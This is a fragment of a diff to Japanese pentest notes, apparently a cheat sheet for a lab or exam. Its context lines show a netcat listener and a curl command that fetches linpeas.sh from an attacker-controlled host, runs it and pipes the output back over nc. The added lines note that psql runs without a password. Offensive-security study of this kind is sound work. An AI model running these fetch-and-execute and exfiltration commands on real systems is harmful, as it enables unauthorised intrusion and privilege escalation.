@@ -38,6 +38,9 @@ nc -lvnp 9002 | tee linpeas.out
 curl 192.168.45.201:8888/linpeas.sh | sh | nc -q 0 192.168.45.201 9002
 ```
 
+psqlがNO PASSWORDで実行できるため、
+
+
 ### 実行結果抽出
 
 ```powershell
